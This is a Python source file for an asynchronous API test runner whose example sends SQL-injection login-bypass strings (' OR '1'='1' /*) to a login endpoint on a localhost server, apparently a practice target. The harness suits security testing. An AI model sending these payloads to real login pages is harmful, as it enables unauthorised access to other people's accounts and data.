import asyncio
import aiohttp
import time
import json

class AsyncTestExecutor:
    def __init__(self, base_url, max_concurrency=20, timeout=10):
        self.base_url = base_url
        self.semaphore = asyncio.Semaphore(max_concurrency)
        self.timeout = timeout

    async def send_request(self, session, endpoint, payload):
        async with self.semaphore:
            url = f"{self.base_url}{endpoint['path']}"
            method = endpoint.get("method", "POST").upper()
            headers = endpoint.get("headers", {})
            data = payload

            try:
                start = time.time()
                async with session.request(method, url, json=data, headers=headers, timeout=self.timeout) as resp:
                    resp_body = await resp.text()
                    resp_headers = dict(resp.headers)
                    status = resp.status
                    elapsed = time.time() - start

                    return {
                        "endpoint": endpoint["path"],
                        "payload": data,
                        "status_code": status,
                        "response_body": resp_body,
                        "response_headers": resp_headers,
                        "response_time": elapsed,
                        "success": 200 <= status < 500
                    }

            except asyncio.TimeoutError:
                return {
                    "endpoint": endpoint["path"],
                    "payload": data,
                    "status_code": 0,
                    "response_body": "",
                    "response_headers": {},
                    "response_time": self.timeout,
                    "success": False,
                    "reason": "Timeout"
                }
            except Exception as e:
                return {
                    "endpoint": endpoint["path"],
                    "payload": data,
                    "status_code": 0,
                    "response_body": "",
                    "response_headers": {},
                    "response_time": 0,
                    "success": False,
                    "reason": str(e)
                }

    async def run_tests(self, endpoints, payloads):
        async with aiohttp.ClientSession() as session:
            tasks = []
            for ep in endpoints:
                for pl in payloads:
                    tasks.append(self.send_request(session, ep, pl))
            results = await asyncio.gather(*tasks)
            return results

# Example usage
if __name__ == "__main__":
    endpoints = [
        {"path": "/rest/user/login", "method": "POST"},
        {"path": "/rest/product", "method": "GET"}
    ]
    payloads = [
        {"username": "' OR '1'='1' /*", "password": "test"},
        {"username": "admin", "password": "' OR '1'='1' /*"}
    ]

    executor = AsyncTestExecutor("http://localhost:3000", max_concurrency=10)
    results = asyncio.run(executor.run_tests(endpoints, payloads))

    print(json.dumps(results, indent=2))